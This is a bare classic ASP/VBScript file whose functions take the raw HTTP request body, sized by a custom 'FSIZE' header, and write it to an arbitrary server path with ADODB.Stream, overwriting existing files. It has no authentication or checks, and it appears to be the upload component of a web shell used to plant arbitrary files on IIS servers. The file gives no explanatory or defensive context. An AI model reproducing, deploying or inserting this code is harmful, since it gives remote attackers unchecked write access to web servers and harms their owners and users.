Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=server.CreateObject(Key)
	Set GetFso=Fso
End Function

Function upload(path,content)
  on error resume next
  result="Failed"
  Const adTypeBinary = 1
  Const adSaveCreateOverWrite = 2
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write content
  BinaryStream.SaveToFile path, adSaveCreateOverWrite
  If Err Then 
	result=Err.Description
	Else
	result="Success" 
  End If
Response.write(result)
End Function

Function main(path)
	fsize=0
	cfsize=Request.ServerVariables("HTTP_FSIZE")
	If IsEmpty(cfsize)=False Then
		fsize=CLng(cfsize)
	End If	
	If fsize>0 Then
		content=Request.BinaryRead(fsize)
		call upload(path,content)
	End If
End Function